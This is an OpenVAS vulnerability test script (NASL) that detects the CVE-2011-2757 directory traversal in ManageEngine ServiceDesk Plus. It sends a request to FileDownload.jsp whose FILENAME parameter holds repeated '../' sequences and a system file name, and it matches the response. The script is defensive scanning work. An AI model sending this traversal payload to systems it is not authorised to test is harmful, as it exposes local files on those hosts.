###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ManageEngine_ServiceDesk_Plus_48403.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# ManageEngine ServiceDesk Plus 'FILENAME' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Updated By: Shashi Kiran N <nskiran@secpod.com> on 2011-07-19
# - Added CVE, cvss_base score, corrected indentation and space
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ManageEngine ServiceDesk Plus is prone to a directory-traversal
vulnerability because the application fails to properly sanitize user-
supplied input.

An attacker can exploit this vulnerability to obtain arbitrary local
files in the context of the webserver process.

ManageEngine ServiceDesk Plus 8.0 is vulnerable; other versions may
also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103184");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-06-29 13:12:40 +0200 (Wed, 29 Jun 2011)");
 script_cve_id("CVE-2011-2757");
 script_bugtraq_id(48403);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");


 script_name("ManageEngine ServiceDesk Plus 'FILENAME' Parameter Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48403");
 script_xref(name : "URL" , value : "http://manageengine.adventnet.com/products/service-desk/");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_ManageEngine_ServiceDesk_Plus_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 8080);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("global_settings.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"ManageEngine") ) exit(0);
files = traversal_files();

foreach file (keys(files)) {

  if(files[file] == "boot.ini") {
     crap = crap(data:"..\",length:3*9);
  } else {
     crap = crap(data:"../",length:3*9);
  }

  url = string(dir, "/workorder/FileDownload.jsp?module=agent&FILENAME=",crap,files[file]);

  if(http_vuln_check(port:port, url:url,pattern:file)) {

    security_message(port:port);
    exit(0);

  }
}

exit(0);
